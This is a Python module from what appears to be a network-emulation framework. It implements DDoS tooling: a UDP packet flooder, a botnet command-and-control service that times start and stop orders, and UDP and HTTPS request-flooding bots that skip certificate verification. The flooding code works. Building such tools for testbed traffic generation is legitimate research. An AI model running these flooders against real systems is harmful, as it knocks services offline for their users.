"""DDoS Bots and Botnets."""
from typing import Tuple

import socket
import urllib3

from emews.api.service import Service, STR_ENCODING_UTF8


def init_udp_socket(packet_size) -> Tuple[socket.socket, bytes]:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if packet_size < 9:
        payload = 'A'  # 1 byte payload (header is 8 bytes)
    else:
        payload = 'A' * (packet_size - 8)

    payload = bytes(payload, STR_ENCODING_UTF8)

    return sock, payload


class DefaultService(Service):
    """Simple UDP flooder.  No C&C."""

    __slots__ = ('_target_address', '_send_delay', '_packet_size', '_bytes_sent')

    def __init__(self, config):
        """Constructor."""
        super().__init__()

        self._target_address: str = config['target_address']  # IP address of target node to flood
        self._send_delay: float = config['send_delay']  # send pktsat this interval
        self._packet_size: int = config['packet_size']  # size of UDP pkt to send

        self._bytes_sent = 0

        self.logger.info("Params: target address: %s, packet send delay: %.2f, packet size: %d",
                         self._target_address, self._send_delay, self._packet_size)

    def service_run(self):
        self._bytes_sent = 0
        sock, payload = init_udp_socket(self._packet_size)

        target_address = self._target_address
        send_delay = self._send_delay

        while True:
            # upon interrupt, sleep() will raise ServiceInterrupted, invoking service_exit()
            self._bytes_sent += sock.sendto(payload, (target_address, 6200))  # just send to some port
            self.sleep(send_delay)

    def service_exit(self) -> None:
        self.logger.info("Total bytes sent: %d", self._bytes_sent)


class BotnetCC(Service):
    """Botnet C&C."""

    CMD_START = 1  # start flooding
    CMD_STOP = 2  # stop flooding

    __slots__ = ('_cc_id', '_flood_start_delay', '_flood_duration')

    def __init__(self, config):
        """Constructor."""
        super().__init__()

        self._flood_start_delay: int = config['flood_start_delay']  # delay (in seconds) to command bots to flood
        self._flood_duration: int = config['flood_duration']  # duration (in seconds) until bots commanded to stop

    def service_run(self) -> None:
        self.sleep(self._flood_start_delay)
        self.send_all(BotnetCC.CMD_START)
        self.sleep(self._flood_duration)
        self.send_all(BotnetCC.CMD_STOP)


class BotBase(Service):
    """Base class for bots."""

    __slots__ = ('_target_address', '_send_delay', '_sent_count')

    def __init__(self, config):
        """Constructor."""
        super().__init__()

        self._target_address: str = config['target_address']  # IP address of target node (to flood/induce a flood)
        self._send_delay: float = config['send_delay']  # send pkts/requests at this interval

        self._sent_count = 0  # number of requests or bytes sent

    def service_run(self) -> None:
        self._sent_count = 0

        cc_cmd = self.recv()[1]

        if cc_cmd == BotnetCC.CMD_START:
            # if bot starts after CC sends the start command, it will not flood
            self.logger.info("Commanded to start flood")

            send_delay = self._send_delay

            while not self.received_data():
                self._sent_count += self.bot_send()
                self.sleep(send_delay)

            if self.recv()[1] != BotnetCC.CMD_STOP:
                self.logger.warning("Received unknown command, expected 'CMD_STOP'")

        elif cc_cmd != BotnetCC.CMD_STOP:
            self.logger.warning("Received unknown command, expected 'CMD_START'")

        self.service_exit()

    def bot_send(self) -> int:
        """Send data to target."""
        raise NotImplementedError


class UDPFloodingBot(BotBase):
    """Bot-based UDP flooder."""

    __slots__ = ('_packet_size', '_sock', '_payload')

    def __init__(self, config):
        """Constructor."""
        super().__init__(config)

        self._packet_size: int = config['packet_size']  # size of UDP pkt to send
        self._sock, self._payload = init_udp_socket(self._packet_size)

        self.logger.info("Params: target address: %s, packet send delay: %.2f, packet size: %d",
                         self._target_address, self._send_delay, self._packet_size)

    def service_exit(self) -> None:
        self.logger.info("Total bytes sent: %d", self._sent_count)

    def bot_send(self) -> int:
        """Send UDP packets to target."""
        return self._sock.sendto(self._payload, (self._target_address, 6200))


class TCPFloodingBot(BotBase):
    """Bot-based TCP flooder, utilizing a request-based flood on the outbound from a target HTTPS server."""

    __slots__ = ('_http',)

    def __init__(self, config: dict):
        """Constructor."""
        super().__init__(config)

        # urllib3 related setup
        urllib3.disable_warnings()  # ignore self-signed SSL certs
        br_header = urllib3.util.make_headers(user_agent=config['user_agent'])
        self._http = urllib3.PoolManager(num_pools=2, headers=br_header, cert_reqs='CERT_NONE')

        self.logger.info("Params: target address: %s, request send delay: %.2f", self._target_address, self._send_delay)

    def service_exit(self) -> None:
        self.logger.info("Total requests sent: %d", self._sent_count)

    def bot_send(self) -> int:
        """Send TCP requests to target.  Induce outbound traffic."""
        try:
            self._http.request('GET', self._target_address)
        except Exception as ex:
            self.logger.warning("On request: %s, (target: %s)", ex, self._target_address)
            return 0

        return 1
